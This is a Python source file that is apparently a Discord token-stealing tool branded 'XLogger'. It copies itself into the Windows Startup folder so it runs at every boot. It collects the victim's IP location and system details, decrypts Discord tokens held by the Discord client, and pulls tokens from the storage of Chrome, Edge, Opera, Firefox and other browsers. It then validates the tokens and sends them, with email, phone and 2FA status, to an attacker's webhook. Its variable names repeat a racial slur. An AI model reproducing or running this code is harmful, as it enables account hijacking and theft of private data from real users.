import requests
import os
import re
import psutil
import subprocess
import platform
import shutil
import json
import base64
import socket
from Cryptodome.Cipher import AES
import win32crypt
from wh import url
import sys

def add_to_startup():
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = sys.executable  
    exe_name = os.path.basename(exe_path)
    destination = os.path.join(startup, exe_name)

    if not os.path.exists(destination):
        shutil.copyfile(exe_path, destination)

add_to_startup() #persistence (every time the victim turns on their computer the file will run)

webhook = url

wheaders = {'content-type': 'application/json'}

regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
regexenc = r"dQw4w9WgXcQ:[^\"']*"

discords = ["https+++ptb.discord.com", "https+++discord.com", "https+++canary.discord.com"]
discordapps = ["discord", "discordptb", "discordcanary", "lightcord"]

def sysinfo():
    plat = platform.system() + " " + platform.release()
    ip = requests.get('https://ipinfo.io/json')
    iplog = ip.json()
    ipadd = iplog.get('ip')
    city = iplog.get('city')
    hostname = iplog.get('hostname')
    region = iplog.get('region')
    country = iplog.get('country')
    loc = iplog.get('loc')
    org = iplog.get('org')
    postal = iplog.get('postal')
    timezone = iplog.get('timezone')
    pcname = socket.gethostname()
    username = os.getenv("USERNAME")
    payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"🖥️ PC Name","value":f"`{pcname}`"},{"name":"🌐 IP Info","value":f"\n`IP Address: {ipadd}`\n`Hostname: {hostname}`\n`Location: {city}, {region}, {country}`\n`Coordinates: {loc}`\n`Organization: {org}`\n`Postal: {postal}`\n`Timezone: {timezone}`"},{"name":"🐏 RAM","value":f"`{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB`"},{"name":"💻 OS","value":f"`{plat}`"},{"name":"👤 User","value":f"`{username}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | System Info","attachments":[]}
    
    sysinfo = requests.post(webhook, headers=wheaders, json=payload)

def verifytks(token):
        headers = {
            "authority": "discord.com",
            "Authorization": token,
            "Content-Type": "application/json",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "cookie": "__dcfduid=aac0334017a911f098842f23d84af171; __sdcfduid=aac0334117a911f098842f23d84af1715c6378665ed7cd80ba063fc1a62dcf56778f8b9a5aed615b6b2b87ad6e5d86dc; __cfruid=9a3b1e8892003974bfb9377d754094aa10c673ba-1744467793; _cfuvid=zWNJz3nNT38rNxvzC4SoAKylV6tgKOPzZLTYT4qLNNU-1744467793016-0.0.1.1-604800000; cf_clearance=LoW2_4j4UvTtzz3Aiuu3oK2W5NxiVXAYipg47Rzauzo-1744467803-1.2.1.1-CpA4qYnkf.rvAVDb6sYTOd4qdORu1Z58uoPvw7zJIHxAPOCRugXSyKJoGsOjKQhOajUHlEO2bwVUAM3OE3lW33HHPxu.BdIvwGnXMYDt8MiReUCoURR9jjPeWTB9zCXYsZzmB3uRYlz9CtyCir_TdgZdvu2vRvbgOjIE8SuS4l6EuRxLm4A1Uzmu.t2zuEyJ0sucFJz9JUw46mX2Hpwy0ljcsB5L8lNdzoPdbGVPw9Soe9LiEQzUGfkQZurc2rsfsDS5eNFUJ0gZnaGiVsg29UvVyjcjuP9t1e_IGzlHcGpgcb_X9t_vYAEZRDkjwxD9Wsmv6pl6sa0Mfn2hdEExb1xJey3GZkupTeIo2DucV6g",
            "origin": "https://discord.com",
            "referer": "https://discord.com/channels/@me",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": "en-US",
            "x-discord-timezone": "America/New_York",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MTg4Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjYxMDAiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJoYXNfY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzEuMC45MTg4IENocm9tZS8xMzAuMC42NzIzLjE5MSBFbGVjdHJvbi8zMy40LjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjMzLjQuMCIsIm9zX3Nka192ZXJzaW9uIjoiMjYxMDAiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozODkwMDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjYxNDQ0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
        }

        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        gift = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions/payment-sources') #ts is scrapped because i didnt feel like making this
        
        if res.status_code == 200:
            print(f'NEW TOKEN LOGGED\n \n {token} \n info: \n{res.text}, {gift.text}')
            def hook(webhook):
                userinfo = res.json()
                username = userinfo.get('username', "N/A")
                email = userinfo.get('email', "N/A")
                id = userinfo.get('id')
                avatar = userinfo.get('avatar')
                phone = userinfo.get('phone', "N/A")
                bio = userinfo.get('bio')
                avatarurl = f"https://cdn.discordapp.com/avatars/{id}/{avatar}" if userinfo.get('avatar') else "None"  
                bioo = bio if userinfo.get('bio') else "None"
                nitro = "True" if userinfo.get("premium_type") else "False"
                mfa = "True" if userinfo.get("mfa_enabled") else "False"
                locale = userinfo.get('locale')
                if avatar == "None":
                    avatarurl = "None"
                
                payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"👤 Username","value":f"`{username}`"},{"name":"🪙 Token","value":f"`{token}`"},{"name":"✉️ Email","value":f"`{email}`"},{"name":"📞 Phone","value":f"`{phone}`"},{"name":"🤔 Bio","value":f"`{bioo}`"},{"name":"📷 PFP","value":f"https://cdn.discordapp.com/avatars/{id}/{avatar}"},{"name":"🔑 2FA","value":f"{mfa}"},{"name":"💔 Nitro","value":f"{nitro}","inline":True},{"name":"🤓 Locale","value":f"`{locale}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | Valid","attachments":[]}
                webhook = requests.post(webhook, headers=wheaders, json=payload)
                print(webhook.text)
            hook(webhook)
        else:
            payload = {"embeds":[{"color":12259344,"fields":[{"name":"❌ Token","value":f"`{token}`"}]}],"username":"TS | Invalid","attachments":[]}
            requests.post(webhook, headers=wheaders, json=payload)
def distks():
    for dis in discordapps:
        discordpath = os.getenv("APPDATA") + f"\\{dis}\\Local Storage\\leveldb\\"
        localstatepath = os.getenv("APPDATA") + f"\\{dis}\\Local State"
        
        if not os.path.exists(discordpath) or not os.path.exists(localstatepath):
            continue

        def masterkey(localstatepath):
            with open(localstatepath, "r", encoding="utf-8") as f:
                ls = json.load(f)
            key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        def decrypttk(val, masterkey):
            val = base64.b64decode(val)
            iv = val[3:15]
            payload = val[15:]
            cipher = AES.new(masterkey, AES.MODE_GCM, iv)
            
            decryptedval = cipher.decrypt(payload)[:-16].decode()
            return decryptedval

            
        key = masterkey(localstatepath)
        
        for file in os.listdir(discordpath):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            
            with open(f'{discordpath}{file}', "r", errors="ignore") as floyd:
                nigger = floyd.read()
                for ambatu in nigger.split("\n"):
                    encss = re.findall(regexenc, ambatu)
                    if encss:
                        enctoken = ambatu.split("dQw4w9WgXcQ:")[1].strip().strip('"').strip("'")[:140]
                        token = decrypttk(enctoken, key)
                        verifytks(token) 
                        
def chrometks():
    def googlechrome():
        chromes = ["Chrome", "Chrome SxS"]
        for chrome in chromes:
            chromepath = os.getenv("LOCALAPPDATA") + f"\\Google\\{chrome}\\User Data"
            
            if not os.path.exists(chromepath): 
                continue
                
            profiles = os.listdir(chromepath)
            for profile in profiles:
                if profile == "Default" or profile.startswith("Profile"):
                    ldb = os.path.join(chromepath, profile, "Local Storage\\leveldb\\")
                    for file in os.listdir(ldb):
                        if not file.endswith(".log") and not file.endswith(".ldb"):
                            continue
                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
    def msedge():
        edgepath = os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data"            
        profiles = os.listdir(edgepath)
        for profile in profiles:
            if profile == "Default" or profile.startswith("Profile"):
                ldb = os.path.join(edgepath, profile, "Local Storage\\leveldb\\")
                for file in os.listdir(ldb):
                    if not file.endswith(".log") and not file.endswith(".ldb"):
                        continue
                    with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                        nigger = floyd.read()
                        for ambatu in nigger.split("\n"):
                            toks = re.findall(regex, ambatu)
                            for token in toks:
                                verifytks(token)
    
    def operatks():
        operas = ["Opera Stable", "Opera Air Stable"]
        for opera in operas:
            operap = os.getenv("APPDATA") + f"\\Opera Software\\{opera}"
            
            if not os.path.exists(operap): 
                continue
                
            profiles = os.listdir(operap)
            for profile in profiles:
                if profile == "Default" or profile.startswith("Profile"):
                    ldb = os.path.join(operap, profile, "Local Storage\\leveldb\\")
                    for file in os.listdir(ldb):
                        if not file.endswith(".log") and not file.endswith(".ldb"):
                            continue
                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
    
    def gxtks():
        sogma = ["l", "l"]
        for l in sogma:
            gx = os.getenv("APPDATA") + f"\\Opera Software\\Opera Gx Stab{l}e"
            if not os.path.exists(gx): 
                continue
            ldb = os.path.join(gx, "Local Storage\\leveldb\\")
            for file in os.listdir(ldb):
                if not file.endswith(".log") and not file.endswith(".ldb"):
                    continue
                with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                    nigger = floyd.read()
                    for ambatu in nigger.split("\n"):
                        toks = re.findall(regex, ambatu)
                        for token in toks:
                            verifytks(token)
                
    def othertks():
        otherchbrowsers = {
            'Amigo': os.getenv("LOCALAPPDATA") + "\\Amigo\\User Data",
            'Avast': os.getenv("LOCALAPPDATA") + "\\AVAST Software\\Browser\\User Data",
            'Brave': os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data",
            'Cent': os.getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data",
            'Epic': os.getenv("LOCALAPPDATA") + "\\Epic Privacy Browser\\User Data",
            'Hola': os.getenv("APPDATA") + "\\Hola\\chromium_profile",
            'Iridium': os.getenv("LOCALAPPDATA") + "\\Iridium\\User Data",
            'Vivaldi': os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data",
            'Yandex': os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data",
        }
        
        for name, browser in otherchbrowsers.items():
            if not os.path.exists(browser): 
                continue
            
            profiles = os.listdir(browser)
            for profile in profiles:
                if profile == "Default" or profile.startswith("Profile"):
                    ldb = os.path.join(browser, profile, "Local Storage\\leveldb\\")
                    for file in os.listdir(ldb):
                        if not file.endswith(".log") and not file.endswith(".ldb"):
                            continue
                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
    def othertks2():
        otherchbrowsers = {
            'Orbitum': os.getenv("LOCALAPPDATA") + "\\Orbitum\\User Data",
            
        }
        
        for name, browser in otherchbrowsers.items():
            if not os.path.exists(browser): 
                continue
            
            profiles = os.listdir(browser)
            for profile in profiles:
                if profile == "Default" or profile.startswith("Profile"):
                    ldb = os.path.join(browser, profile, "data_reduction_proxy_leveldb\\")
                    for file in os.listdir(ldb):
                        if not file.endswith(".log") and not file.endswith(".ldb"):
                            continue
                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
            
    googlechrome()
    msedge()
    gxtks()
    operatks()
    othertks()
    othertks2()
    
def firefox():
    def mozff():
        ls = ['l', 'l']
        for l in ls:
            firefoxpath = os.getenv("APPDATA") + f"\\Mozilla\\Firefox\\Profi{l}es\\"
            if not os.path.exists(firefoxpath): 
                continue
            profiles = os.listdir(firefoxpath)
            for profile in profiles:
                for discord in discords:
                    ff = os.path.join(profile, f"storage\\default\\{discord}\\ls\\data.sqlite")
                    if os.path.exists(firefoxpath + ff):
                        with open(f"{firefoxpath}{ff}", "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)
    
    def othertks(): #idek if this works because i havent tried it
        otherffbrowsers = {
        'Waterfox': os.getenv("APPDATA") + "\\Waterfox\\Profiles\\",
        'Librewolf': os.getenv("APPDATA") + "\\LibreWolf\\Profiles\\",
    }
    
        for name, browser in otherffbrowsers.items():
            if not os.path.exists(browser): 
                continue
        
            profiles = os.listdir(browser)
            for profile in profiles:
                for discord in discords:
                    ff = os.path.join(profile, f"storage\\default\\{discord}\\ls\\data.sqlite")
                    if os.path.exists(browser + ff):
                        with open(f"{browser}{ff}", "r", errors="ignore") as floyd:
                            nigger = floyd.read()
                            for ambatu in nigger.split("\n"):
                                toks = re.findall(regex, ambatu)
                                for token in toks:
                                    verifytks(token)

    mozff()
    othertks()

sysinfo()    
distks()
chrometks()
firefox()

        
